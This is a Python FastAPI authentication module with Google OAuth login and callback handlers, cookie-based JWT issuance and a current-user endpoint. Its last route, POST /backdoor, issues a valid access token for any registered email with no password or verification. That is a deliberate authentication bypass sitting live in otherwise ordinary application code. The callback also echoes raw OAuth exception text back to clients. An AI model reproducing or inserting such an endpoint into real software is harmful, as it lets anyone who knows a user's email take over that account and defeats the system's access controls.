from fastapi import APIRouter, HTTPException, Request
from fastapi import Depends
from fastapi.responses import RedirectResponse
from sqlalchemy.ext.asyncio import AsyncSession
from starlette import status
from loguru import logger
from datetime import datetime, timezone

from app.core.oauth import oauth
from app.core.config import settings
from app.core.security import create_access_token, get_current_user
from app.core.database import get_db
from app.schemas.user import User, UserCreate
from app.crud import crud_user
from app.schemas.token import TokenResponse
from app.schemas.user import UserRead, UserUpdate
from app.api.responses import ResponseModel, response_helper

router = APIRouter()


@router.get("/login")
async def login(request: Request):
    """Redirect to Google OAuth login."""
    redirect_uri = settings.GOOGLE_REDIRECT_URI
    return await oauth.google.authorize_redirect(request, redirect_uri)


@router.get("/callback", response_model=ResponseModel[TokenResponse])
async def callback(request: Request, db: AsyncSession = Depends(get_db)):
    """Handles the callback from Google, creates/finds user, returns JWT."""
    try:
        token = await oauth.google.authorize_access_token(request)
    except Exception as e:
        logger.error(f"Get token fail: {e}")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=f"Google OAuth Error: {str(e)}",
        )

    user_info = token.get("userinfo")
    if not user_info:
        # Sometimes userinfo is inside the 'id_token' claims
        user_info = token.get("user_info")
        if not user_info:
            logger.error("User info not found")
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to obtain user info.",
            )

    email = user_info.get("email")
    oidc_oid = user_info.get("oid")

    if not email:
        raise HTTPException(
            status_code=400, detail="Email not found in OIDC user info."
        )

    user = await crud_user.get_by_email(db, email=email)
    if not user:
        # create new user
        obj_in = UserCreate(
            email=email,
            oidc_oid=oidc_oid,
        )
        user = await crud_user.create(db, obj_in=obj_in)

    if not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="User account is inactive.",
        )

    await crud_user.update(
        db,
        db_obj=user,
        obj_in=UserUpdate(oidc_oid=oidc_oid, last_login_at=datetime.now(timezone.utc)),
    )

    # re-fetch to ensure role is populated
    user = await crud_user.get_by_id(db, id=user.id)
    access_token = create_access_token(user)

    # set cookie and redirect
    response = RedirectResponse(settings.FRONTEND_REDIRECT_URL)
    response.set_cookie(
        key="token",
        value=access_token,
        httponly=True,
        secure=settings.AUTH_COOKIE_SECURE,
        samesite=settings.AUTH_COOKIE_SAMESITE,
    )
    return response


@router.get("/me", response_model=ResponseModel[UserRead])
async def read_users_me(current_user: User = Depends(get_current_user)):
    """Get current logged in user."""
    return response_helper(current_user)


@router.post("/backdoor", response_model=ResponseModel[TokenResponse])
async def backdoor(email: str, db: AsyncSession = Depends(get_db)):
    """
    Generates a valid token for ANY email without password.
    """
    user = await crud_user.get_by_email(db, email=email)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    access_token = create_access_token(user)
    return response_helper(data=TokenResponse(access_token=access_token))
